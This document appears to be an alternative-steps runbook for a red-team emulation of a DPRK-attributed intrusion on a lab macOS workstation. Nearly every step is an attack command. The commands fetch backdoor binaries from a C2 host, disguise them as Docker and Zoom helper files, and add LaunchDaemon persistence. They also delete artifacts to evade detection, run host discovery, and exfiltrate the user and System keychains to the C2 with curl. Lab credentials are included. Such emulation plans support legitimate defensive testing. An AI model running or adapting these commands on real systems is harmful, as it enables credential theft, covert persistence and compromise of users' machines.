# This is the ALTERNATIVE instruction set for the Scenario

Legend of symbols:

* :bulb: - callout notes
* :heavy_exclamation_mark: - extremely important note
* :arrow_right: - Switching to another session
* :o: - Sign out of something
* :biohazard: - Procedure for a given step

This document provides alternative steps to perform if a particular portion of a step fails to execute.
Due to the nature of the scenario and its components, not every part has a
corresponding alternative
step, and most alternative steps will sacrifice certain parts of the scenario,
in particular the emulated TTPs.

## Step 1 - Command and Control

### Ruby script failed to download FULLHOUSE.DOORED

#### :biohazard: Tier 1 Procedures

* :arrow_right: From the Windows jumpbox `spitfire (223.246.0.90)`, initiate a
VNC session to the macOS victim workstation `hogshead (10.55.4.50)` as
`encryptpotter.net\ranrok`.

    | VNC server | Password |
    | -------- | -------- |
    | 10.55.4.50::5900 | test1234 |

  * At the macOS login screen, authenticate with the following credentials:

    | Username | Password |
    | -------- | -------- |
    | ranrok | Ladylike-Laugh |

* Open a Terminal and elevate to sudo, providing the following password when
prompted:

    ```bash
    sudo su
    ```

    | Password |
    | -------- |
    | Ladylike-Laugh |

* Execute curl to download the FULLHOUSE.DOORED binary and configuration

    ```zsh
    curl --output "/usr/local/bin/com.docker.sock" http://b0ring-t3min4l.kr/files/com.docker.sock
    curl --output "/usr/local/bin/com.docker.sock.lock" http://b0ring-t3min4l.kr/files/com.docker.sock.lock
    ```

  * The above resolves to:
    * `com.docker.sock` - FULLHOUSE.DOORED binary
    * `com.docker.sock.lock` - FULLHOUSE.DOORED configuration file

* Check using Finder to see if the files were downloaded successfully

* Proceed with
[Ruby script failed to execute FULLHOUSE.DOORED](./AlternativeSteps.md#ruby-script-failed-to-execute-fullhousedoored)

### Ruby script failed to execute FULLHOUSE.DOORED

#### :biohazard: Tier 1 Procedures

* Change directory into `/usr/local/bin` and execute FULLHOUSE.DOORED

    ```zsh
    cd /usr/local/bin
    chmod 0755 com.docker.sock
    ./com.docker.sock
    ```

* :arrow_right: On Kali, confirm C2 registration of FULLHOUSE.DOORED

* :arrow_right: On the Mac VNC session, close the Terminal and disconnect from
the session

## Step 2 - Persistence

### FULLHOUSE.DOORED failed/unavailable to download STRATOFEAR

#### :biohazard: Tier 1 Procedures

* If FULLHOUSE.DOORED **is** available:
  * Task FULLHOUSE.DOORED to download STRATOFEAR to `hogshead (10.55.4.50)` using
  `curl`:

    ```bash
    ./evalsC2client.py --set-task 01A48A493AC92607E79CB427067C0A42 '{"id": 1, "arg": "curl --output \"/Library/PrivilegedHelperTools/us.zoom.ZoomHelperTool\" http://b0ring-t3min4l.kr/files/stratofear"}'
    ```

  * Task FULLHOUSE.DOORED to download STRATOFEAR's configuration file to
`hogshead (10.55.4.50)` using `curl`:

    ```bash
    ./evalsC2client.py --set-task 01A48A493AC92607E79CB427067C0A42 '{"id": 1, "arg": "curl --output \"/Library/Fonts/pingfang.ttf.md5\" http://b0ring-t3min4l.kr/files/pingfang.ttf.md5"}'
    ```

  * Task FULLHOUSE.DOORED to download STRATOFEAR's LaunchDaemon plist file to
`hogshead (10.55.4.50)` using `curl`:

    ```bash
    ./evalsC2client.py --set-task 01A48A493AC92607E79CB427067C0A42 '{"id": 1, "arg": "curl --output \"/Library/LaunchDaemons/us.zoom.ZoomHelperTool.plist\" http://b0ring-t3min4l.kr/files/startofear_launchd.plist"}'
    ```

  * Return to the emulation plan to task
    [FULLHOUSE.DOORED to set STRATOFEAR as executable](./ER6_DPRK_Scenario.md#step-2---persistence)

* If FULLHOUSE.DOORED **is not** available:

  * :arrow_right: From the Windows jumpbox `spitfire (223.246.0.90)`, initiate
  a VNC session to the macOS victim workstation `hogshead (10.55.4.50)` as
  `encryptpotter.net\ranrok`.

    | VNC server | Password |
    | -------- | -------- |
    | 10.55.4.50::5900 | test1234 |

  * At the macOS login screen, authenticate with the following credentials:

    | Username | Password |
    | -------- | -------- |
    | ranrok | Ladylike-Laugh |

  * Open a Terminal and elevate to sudo, providing the following password when
prompted:

    ```bash
    sudo su
    ```

    | Password |
    | -------- |
    | Ladylike-Laugh |

  * Execute curl to download the STRATOFEAR binary, configuration, and plist file:

    ```zsh
    curl --output "/Library/PrivilegedHelperTools/us.zoom.ZoomHelperTool" http://b0ring-t3min4l.kr/files/stratofear
    curl --output "/Library/Fonts/pingfang.ttf.md5" http://b0ring-t3min4l.kr/files/pingfang.ttf.md5
    curl --output "/Library/LaunchDaemons/us.zoom.ZoomHelperTool.plist" http://b0ring-t3min4l.kr/files/stratofear_launchd.plist
    ```

  * Check using Finder to see if the files were downloaded successfully.

  * Proceed with
  [FULLHOUSE.DOORED failed/unavailable to set STRATOFEAR as executable](./AlternativeSteps.md#fullhousedoored-failedunavailable-to-set-stratofear-as-executable)

### FULLHOUSE.DOORED failed/unavailable to set STRATOFEAR as executable

#### :biohazard: Tier 1 Procedures

* :arrow_right: From the Windows jumpbox `spitfire (223.246.0.90)`, initiate a
VNC session to the macOS victim workstation `hogshead (10.55.4.50)` as
`encryptpotter.net\ranrok`.

    | VNC server | Password |
    | -------- | -------- |
    | 10.55.4.50::5900 | test1234 |

  * At the macOS login screen, authenticate with the following credentials:

    | Username | Password |
    | -------- | -------- |
    | ranrok | Ladylike-Laugh |

* Open a Terminal and elevate to sudo, providing the following password when
prompted:

    ```bash
    sudo su
    ```

    | Password |
    | -------- |
    | Ladylike-Laugh |

* Set STRATOFEAR as executable via chmod:

    ```bash
    chmod 0755 /Library/PrivilegedHelperTools/us.zoom.ZoomHelperTool
    ```

* If FULLHOUSE.DOORED **is** available:
  * Return to the emulation plan to task
    [FULLHOUSE.DOORED to execute STRATOFEAR via launchctl](./ER6_DPRK_Scenario.md#step-2---persistence)

* If FULLHOUSE.DOORED **is not** available:
  * Proceed with
  [FULLHOUSE.DOORED failed/unavailable to execute launchctl](./AlternativeSteps.md#fullhousedoored-failedunavailable-to-execute-launchctl)

### FULLHOUSE.DOORED failed/unavailable to execute launchctl

#### :biohazard: Tier 1 Procedures

* :arrow_right: From the Windows jumpbox `spitfire (223.246.0.90)`, initiate a
VNC session to the macOS victim workstation `hogshead (10.55.4.50)` as
`encryptpotter.net\ranrok`.

    | VNC server | Password |
    | -------- | -------- |
    | 10.55.4.50::5900 | test1234 |

  * At the macOS login screen, authenticate with the following credentials:

    | Username | Password |
    | -------- | -------- |
    | ranrok | Ladylike-Laugh |

* Open a Terminal and elevate to sudo, providing the following password when
prompted:

    ```bash
    sudo su
    ```

    | Password |
    | -------- |
    | Ladylike-Laugh |

* Execute STRATOFEAR via launchctl:

    ```bash
    launchctl load -w /Library/LaunchDaemons/us.zoom.ZoomHelperTool.plist
    ```

* :arrow_right: On Kali, confirm C2 registration of STRATOFEAR

:heavy_exclamation_mark: If the above procedure fails, proceed to [LaunchDaemon failed to execute STRATOFEAR](./AlternativeSteps.md#launchdaemon-failed-to-execute-stratofear)

### LaunchDaemon failed to execute STRATOFEAR

#### :biohazard: Tier 1 Procedures

* :arrow_right: From the Windows jumpbox `spitfire (223.246.0.90)`, initiate a
VNC session to the macOS victim workstation `hogshead (10.55.4.50)` as
`encryptpotter.net\ranrok`.

    | VNC server | Password |
    | -------- | -------- |
    | 10.55.4.50::5900 | test1234 |

  * At the macOS login screen, authenticate with the following credentials:

    | Username | Password |
    | -------- | -------- |
    | ranrok | Ladylike-Laugh |

* Open a Terminal and elevate to sudo, providing the following password when
prompted:

    ```bash
    sudo su
    ```

    | Password |
    | -------- |
    | Ladylike-Laugh |

* Execute STRATOFEAR:

    ```bash
    /Library/PrivilegedHelperTools/us.zoom.ZoomHelperTool
    ```

* :arrow_right: On Kali, confirm C2 registration of STRATOFEAR

## Step 3 - Defense Evasion

### FULLHOUSE.DOORED failed to exit

#### :biohazard: Tier 1 Procedures

* :arrow_right: From the Windows jumpbox `spitfire (223.246.0.90)`, initiate a
VNC session to the macOS victim workstation `hogshead (10.55.4.50)` as
`encryptpotter.net\ranrok`.

    | VNC server | Password |
    | -------- | -------- |
    | 10.55.4.50::5900 | test1234 |

  * At the macOS login screen, authenticate with the following credentials:

    | Username | Password |
    | -------- | -------- |
    | ranrok | Ladylike-Laugh |

* Open a Terminal and elevate to sudo, providing the following password when
prompted:

    ```bash
    sudo su
    ```

    | Password |
    | -------- |
    | Ladylike-Laugh |

* Delete the FULLHOUSE.DOORED artifacts:

    ```bash
    rm -f com.docker.sock com.docker.sock.lock
    ```

* Kill the FULLHOUSE.DOORED process:

    ```bash
    pkill com.docker.sock
    ```

## Step 4 - Collection

### STRATOFEAR failed/unavailable to perform discovery

#### :biohazard: Tier 1 Procedures

* If FULLHOUSE.DOORED **is** available download and execute discovery program to
execute discovery commands.

* Task FULLHOUSE.DOORED to download discovery program to `hogshead (10.55.4.50)`:

  ```bash
  ./evalsC2client.py --set-task 01A48A493AC92607E79CB427067C0A42 '{"id": 2, "payload": "macho_discovery", "arg":"/Library/PrivilegedHelperTools/us.zoom.ZoomHelperTool-discovery"}'
  ```

* Task FULLHOUSE.DOORED to add executable permissions to the discovery executable:

  ```bash
  ./evalsC2client.py --set-task 01A48A493AC92607E79CB427067C0A42 '{"id": 1, "arg": " chmod +x /Library/PrivilegedHelperTools/us.zoom.ZoomHelperTool-discovery"}'
  ```

* Task FULLHOUSE.DOORED to execute the discovery program on `hogshead (10.55.4.50)`:

  ```bash
  ./evalsC2client.py --set-task 01A48A493AC92607E79CB427067C0A42 '{"id": 1, "arg": "/Library/PrivilegedHelperTools/us.zoom.ZoomHelperTool-discovery"}'
  ```

* If FULLHOUSE.DOORED **is not** available:
  * :arrow_right: From the Windows jumpbox `spitfire (223.246.0.90)`, initiate a
  VNC session to the macOS victim workstation `hogshead (10.55.4.50)` as
  `encryptpotter.net\ranrok`.

    | VNC server | Password |
    | -------- | -------- |
    | 10.55.4.50::5900 | test1234 |

  * At the macOS login screen, authenticate with the following credentials:

    | Username | Password |
    | -------- | -------- |
    | ranrok | Ladylike-Laugh |

  * Open a Terminal and elevate to sudo, providing the following password when
  prompted:

      ```zsh
      sudo su
      ```

      | Password |
      | -------- |
      | Ladylike-Laugh |

  * Execute the following commands:

      ```zsh
      logname
      /usr/sbin/system_profiler SPHardwareDataType
      /usr/bin/sw_vers
      dscl . -list /Users | grep -v '^_'
      ```

:heavy_exclamation_mark: If the above procedure fails, proceed to [STRATOFEAR failed/unavailable to load Keychain module](./AlternativeSteps.md#STRATOFEAR-failedunavailable-to-load-Keychain-module)

### STRATOFEAR failed/unavailable to load Keychain module

#### :biohazard: Tier 1 Procedures

* If FULLHOUSE.DOORED **is** available:
  * Task FULLHOUSE.DOORED to download the dynamic library (dylib) to `hogshead (10.55.4.50)`:

    ```bash
    ./evalsC2client.py --set-task 01A48A493AC92607E79CB427067C0A42 '{"id": 2, "payload": "libmodule_keychain.dylib", "arg":"/tmp/XYZ.tmp"}'
    ```

  * Task FULLHOUSE.DOORED to give executable permissions to the dylib:

    ```bash
    ./evalsC2client.py --set-task 01A48A493AC92607E79CB427067C0A42 '{"id": 1, "arg": "chmod +x /tmp/XYZ.tmp"}'
    ```

  * Task FULLHOUSE.DOORED to download the runner (mach-o):

    ```bash
    ./evalsC2client.py --set-task 01A48A493AC92607E79CB427067C0A42 '{"id": 2, "payload": "runnerPath", "arg":"/Library/PrivilegedHelperTools/us.zoom.ZoomHelperTool-Runner"}'
    ```

  * Task FULLHOUSE.DOORED to give executable permissions to the the runner program:

    ```bash
    ./evalsC2client.py --set-task 01A48A493AC92607E79CB427067C0A42 '{"id": 1, "arg": "chmod +x /Library/PrivilegedHelperTools/us.zoom.ZoomHelperTool-Runner"}'
    ```

  * Task FULLHOUSE.DOORED to execute the runner with the path (`/tmp/XYZ.tmp`)
  to the dylib:
  **Note** If the runner program is executed with no path provided it's default
  path is `/tmp/ABCDEF.tmp`.

    ```bash
    ./evalsC2client.py --set-task 01A48A493AC92607E79CB427067C0A42 '{"id": 1, "arg": "/Library/PrivilegedHelperTools/us.zoom.ZoomHelperTool-Runner -p /tmp/XYZ.tmp"}'
    ```

* If FULLHOUSE.DOORED **is not** available:

  * :arrow_right: From the Windows jumpbox `spitfire (223.246.0.90)`, initiate
  a VNC session to the macOS victim workstation `hogshead (10.55.4.50)` as
  `encryptpotter.net\ranrok`.

    | VNC server | Password |
    | -------- | -------- |
    | 10.55.4.50::5900 | test1234 |

  * At the macOS login screen, authenticate with the following credentials:

    | Username | Password |
    | -------- | -------- |
    | ranrok | Ladylike-Laugh |

* Open a Terminal and elevate to sudo, providing the following password when
prompted:

    ```bash
    sudo su
    ```

    | Password |
    | -------- |
    | Ladylike-Laugh |

* Execute curl to download the runner mach-o (`us.zoom.ZoomHelperTool-Runner`)
and the dylib (`XYZ.tmp`):

    ```zsh
    curl --output "/Library/PrivilegedHelperTools/us.zoom.ZoomHelperTool-Runner" http://b0ring-t3min4l.kr/files/runnerPath
    curl --output "/tmp/XYZ.tmp" http://b0ring-t3min4l.kr/files/libmodule_keychain.dylib
    ```

* Check using Finder to see if the files were downloaded successfully

* Execute the runner to load and execute the dylib:

    ```bash
    chmod +x /Library/PrivilegedHelperTools/us.zoom.ZoomHelperTool-Runner
    /Library/PrivilegedHelperTools/us.zoom.ZoomHelperTool-Runner -p /tmp/XYZ.tmp
    ```

* Proceed to [STRATOFEAR failed/unavailable to exfil Keychain](./AlternativeSteps.md#STRATOFEAR-failedunavailable-to-exfil-keychain)

### STRATOFEAR failed/unavailable to exfil keychain

#### :biohazard: Tier 1 Procedures

* If FULLHOUSE.DOORED **is** available:
  * Task FULLHOUSE.DOORED to upload the user's keychain file to the C2 server:

    ```bash
    ./evalsC2client.py --set-task 01A48A493AC92607E79CB427067C0A42 '{"id": 3, "arg":"/Users/ranrok/Library/Keychains/login.keychain-db"}'
    ```

  * Task FULLHOUSE.DOORED to upload the user's keychain file to the C2 server:

    ```bash
    ./evalsC2client.py --set-task 01A48A493AC92607E79CB427067C0A42 '{"id": 3, "arg":"/Library/Keychains/System.keychain"}'
    ```

  * Return to the emulation plan

* If FULLHOUSE.DOORED **is not** available:

  * :arrow_right: From the Windows jumpbox `spitfire (223.246.0.90)`, initiate
  a VNC session to the macOS victim workstation `hogshead (10.55.4.50)` as
  `encryptpotter.net\ranrok`.

    | VNC server | Password |
    | -------- | -------- |
    | 10.55.4.50::5900 | test1234 |

  * At the macOS login screen, authenticate with the following credentials:

    | Username | Password |
    | -------- | -------- |
    | ranrok | Ladylike-Laugh |

  * Open a Terminal and execute curl to upload the user's Keychain files to the
  C2's File server:

  ```zsh
  curl -X POST -H "filename:usersKeychain" --data-binary @/Users/ranrok/Library/Keychains/login.keychain-db http://b0ring-t3min4l.kr/uploads
  ```

  * Open a Terminal and execute curl to upload the user's Keychain files to the
  C2's File server:

  ```zsh
  curl -X POST -H "filename:systemKeychain" --data-binary @/Library/Keychains/System.keychain http://b0ring-t3min4l.kr/uploads
  ```

  * Check the C2 server to verify the files were uploaded successfully.

### STRATOFEAR failed/unavailable to monitor devices

#### :biohazard: Tier 1 Procedures

* If FULLHOUSE.DOORED **is** available:

  * Task FULLHOUSE.DOORED to download the device monitor executable (mach-o) to the
  system:

    ```bash
    ./evalsC2client.py --set-task 01A48A493AC92607E79CB427067C0A42 '{"id": 2, "payload": "macho_monitorDevices", "arg":"/Library/PrivilegedHelperTools/us.zoom.ZoomHelperTool-monitor"}'
    ```

  * Task FULLHOUSE.DOORED to give the device monitor executable permissions to run:

    ```bash
    ./evalsC2client.py --set-task 01A48A493AC92607E79CB427067C0A42 '{"id": 1, "arg": "chmod +x /Library/PrivilegedHelperTools/us.zoom.ZoomHelperTool-monitor"}'
    ```

  * Task FULLHOUSE.DOORED to execute the device monitor.

    ```bash
    ./evalsC2client.py --set-task 01A48A493AC92607E79CB427067C0A42 '{"id": 1, "arg": "/Library/PrivilegedHelperTools/us.zoom.ZoomHelperTool-monitor"}'
    ```

* If FULLHOUSE.DOORED **is not** available:

  * :arrow_right: From the Windows jumpbox `spitfire (223.246.0.90)`, initiate
  a VNC session to the macOS victim workstation `hogshead (10.55.4.50)` as
  `encryptpotter.net\ranrok`.

    | VNC server | Password |
    | -------- | -------- |
    | 10.55.4.50::5900 | test1234 |

  * At the macOS login screen, authenticate with the following credentials:

    | Username | Password |
    | -------- | -------- |
    | ranrok | Ladylike-Laugh |

* Open a Terminal and elevate to sudo, providing the following password when
prompted:

    ```bash
    sudo su
    ```

    | Password |
    | -------- |
    | Ladylike-Laugh |

* Execute curl to download the device monitor mach-o (`us.zoom.ZoomHelperTool-monitor`):

    ```zsh
    curl --output "/Library/PrivilegedHelperTools/us.zoom.ZoomHelperTool-monitor" http://b0ring-t3min4l.kr/files/macho_monitorDevices
    ```

  * The above resolves to:
    * `us.zoom.ZoomHelperTool-monitor` - a mach-o that installs a monitor on the
    `/Volumes` folder. When devices are mounted, the program will print out the
    event and append it to the `/Library/Fonts/AppleSDGothicNeo.ttc.1` file.

* Check using Finder to see if the files were downloaded successfully

* Execute the device monitor:

    ```bash
    chmod +x /Library/PrivilegedHelperTools/us.zoom.ZoomHelperTool-monitor
    /Library/PrivilegedHelperTools/us.zoom.ZoomHelperTool-monitor
    ```

* End of Emulation
